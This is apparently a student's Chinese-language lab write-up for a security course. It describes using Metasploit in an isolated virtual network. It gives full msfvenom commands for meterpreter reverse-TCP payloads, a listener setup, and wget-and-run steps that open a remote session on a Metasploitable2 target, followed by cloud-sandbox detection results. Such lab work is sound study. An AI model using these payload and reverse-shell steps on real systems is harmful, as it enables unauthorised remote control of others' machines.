---
title: 网络渗透测试作业：基于 Metasploit 的远程控制实验
date: 2026-11-08 16:50:00
categories:
  - 学习笔记
tags:
  - 网络安全
  - 网络渗透测试
  - Metasploit
---

这学期 Web 安全课讲到第 6 章「远程控制」，任务一是让我们自己把整套流程走一遍：先在 Kali 上生成一个被控端程序，再开一个监听等它连回来，连上之后能远程执行系统命令，最后把这个程序传到云沙箱里，看看杀毒软件会怎么判它。

整个实验都在我自己搭的虚拟机内网里完成，没有碰任何公网或者别人的机器，文中涉及 IP 的地方也都用占位符代替。下面按实验的先后顺序记一遍，中间踩到的坑也一起写下来。

<!-- more -->

## 一、实验环境

| 角色 | 用的东西 | 说明 |
|---|---|---|
| 攻击机（主控端） | Kali Linux + Metasploit Framework 6.5.7 | 生成被控端、开监听、接收会话 |
| 靶机（被控端） | Metasploitable2（Ubuntu 8.04） | 运行 Linux 版被控端 |
| 宿主机 | Windows 11 + VMware Workstation | Host-only 隔离网络；提交云沙箱 |
| 云沙箱 | 微步云沙箱 s.threatbook.com | 检测 Windows 版被控端 |

课件里演示的是用 Windows 被控端去控 Windows 靶机，但我这边没准备 Windows 靶机，就换成了 Linux 版的被控端去连 Metasploitable2；Windows 版那个程序留着，最后专门用来传云沙箱。换的只是系统和文件格式，生成、监听、连回来这一套流程其实是一样的。

## 二、先弄明白几个东西

- **msfvenom**：Metasploit 里用来"做"被控端程序的工具。做的时候要告诉它回连到哪个 IP、哪个端口，这些信息会直接写进生成的程序里。
- **反向连接（reverse_tcp）**：不是主控端主动去连靶机，而是被控端自己主动连回来。好处是比较容易穿过 NAT 和防火墙，比正向连成功率高。
- **multi/handler**：Metasploit 里的一个通用监听器，守在攻击机这边等被控端上线，连上之后再把真正的功能送过去。
- **meterpreter**：连上以后拿到的那个会话，可以在里面执行系统命令、查看靶机信息，差不多就是一个远程命令行。
- **云沙箱**：把样本丢进隔离环境里跑一遍，从文件特征、多家杀软的查杀结果和运行行为几个方面判断它是不是恶意程序。

还有一个我试错试出来的规矩：Linux 的程序要配 elf 格式，Windows 的配 exe 格式。我一开始把 Windows 的配置和 elf 写到了一起，直接报 `The payload could not be generated, check options`，改成对应格式就好了。

## 三、实验步骤

### 3.1 生成被控端

在 Kali 里生成 Linux 和 Windows 两个版本。IP 我懒得手敲、也怕敲错，就用 `hostname -I` 让系统自己取本机地址：

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$(hostname -I | awk '{print $1}') LPORT=5000 -a x86 --platform linux -f elf -o ~/payload.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(hostname -I | awk '{print $1}') LPORT=5000 -a x64 --platform windows -f exe -o ~/payload.exe
```

看到 `Saved as: ...` 就是成了。用 `ls -l` 看一眼大小，`payload.elf` 只有 207 字节左右，`payload.exe` 大概 7.5 KB。elf 那个这么小，是因为它只是个"引子"，真正的功能要等连上主控端之后才会下载过来。

### 3.2 开主控端监听

```text
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 5000
run
```

`set LHOST 0.0.0.0` 是让它监听本机所有网卡，省得再手填 IP；被控端里写的是 Kali 的真实地址，会自己连回来。屏幕上出现 `[*] Started reverse TCP handler on 0.0.0.0:5000` 就说明监听起来了。

这里有个地方我卡了挺久：`use` 之后框架默认给的是 `generic/shell_reverse_tcp`，必须手动 `set payload linux/x86/meterpreter/reverse_tcp` 改成和被控端一致的，不然会话怎么都建不起来。

### 3.3 把程序放到靶机上跑起来

Kali 另开一个终端，在家目录起个临时的下载服务（记得带 `--bind 0.0.0.0`，不然 Python 默认只监听 IPv6，靶机那边会直接 Connection refused）：

```bash
cd ~ && python3 -m http.server 8000 --bind 0.0.0.0
```

再到 Metasploitable2 里下载、加执行权限、运行：

```bash
wget http://<KaliIP>:8000/payload.elf
chmod +x payload.elf
./payload.elf
```

`./payload.elf` 跑起来之后终端没有任何输出、也不返回提示符，这是正常的，它已经在后台往 Kali 连了，别按 Ctrl+C 把它掐掉。

### 3.4 确认真的控上了

切回 msfconsole，看到：

```text
[*] Meterpreter session 1 opened (...)
meterpreter >
```

在这个 `meterpreter >` 里敲一句 `sysinfo`，靶机的系统信息就出来了：

```text
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
Meterpreter  : x86/linux
```

![meterpreter 会话里执行 sysinfo，返回靶机系统信息](/img/01_meterpreter_sysinfo.png)

到这一步，就算真的把靶机控上了。

## 四、云沙箱检测

把 Windows 版那个 `payload.exe` 传到微步云沙箱（`https://s.threatbook.com/`）看看结果。因为 Kali 在 Host-only 内网里出不去，火狐还配了代理，这一步我是从能上网的宿主机浏览器，先通过 Kali 那个临时下载服务把样本取回来，再上传的。

判定结果汇总：

| 项目 | 结果 |
|---|---|
| 判定 | 恶意 |
| 威胁分类 | 木马 |
| 木马家族 | Metasploit |
| 场景标签 | 红队工具 - C2 框架 - Metasploit |
| 多引擎检出 | 12 / 28 |
| 典型检出名 | BackDoor.Meterpreter.1465、Trojan/Metasploit.HUB、Trojan:Win32/Zusy 等 |
| 文件类型 | PE32+ executable (GUI) x86-64，7.5 KB |

![云沙箱判定页：恶意 / 木马 / Metasploit 家族](/img/02_sandbox_verdict.png)

![多引擎检测：28 家引擎里 12 家报毒](/img/03_sandbox_multiscan.png)

![静态分析：文件格式与样本哈希](/img/04_sandbox_static.png)

看下来，多数引擎给它起的名字都带 "Meterpreter" 或 "Metasploit"，也就是说杀软认出来的是这个框架本身的特征和它会往外连的行为，并不是它利用了什么具体漏洞。说白了，这种现成框架做出来的程序太有名了，特征一抓一个准。

## 五、中间踩的坑

| 现象 | 原因 | 怎么解决 |
|---|---|---|
| `msfconsole` 报一大堆 `Could not find ... in locally installed gems` | Ruby 依赖缺了 | 重装 `metasploit-framework`；升级后只剩 `stringio`，再补一下系统 Ruby 依赖 |
| 监听窗口刷出 `^[[B^[[B...` | 阻塞状态下方向键的转义码被原样回显 | 不是报错，别按 Ctrl+C，继续往下做就行 |
| `wget ... Connection refused` | ① 服务只监听了 IPv6；② 地址填成宿主机而不是 Kali | 加 `--bind 0.0.0.0`；用 `hostname -I` 取 Kali 自己的地址，并确认两台机器 IP 前三段一致 |
| `The payload could not be generated` | Windows 的配置配了 elf 格式 | 按平台配对：Linux 用 elf、Windows 用 exe |
| `chmod: No such file or directory` | 上一步 wget 没成功，文件根本没下载下来 | 先把下载服务弄好，再执行 chmod |
| Kali 火狐打不开沙箱网站 | Host-only 没有外网，浏览器又配了代理 | 云沙箱这步改在能上网的宿主机上做 |
| Windows 下载样本被 Defender / SmartScreen 拦 | 杀软按文件内容认出是木马 | 临时关掉「实时保护」完成下载和上传，之后立刻恢复，并删掉本地样本 |

最后这条其实还挺有意思：下载样本的时候系统自带的 Defender 直接把它拦了，反过来说明这确实是个正经的 meterpreter 被控端，不然也不会被 12 家引擎一致判成后门。

## 六、小结

这次把「生成被控端 → 开监听 → 反向连回来拿到会话 → 云沙箱检测」这一整条流程走通了，也算是把课本上"反向连接"这几个字亲手做了一遍。印象比较深的是最后沙箱的结果：这么一个只有 7.5 KB 的小程序，28 家引擎里有 12 家直接报毒，可见这类框架生成的程序在现在的防护面前基本藏不住。

站在防守的一边想，光靠杀软记特征好像也不太够，及时更新终端防护、限制服务器随便往外连、对异常的外连多做点监控，可能更管用一些。
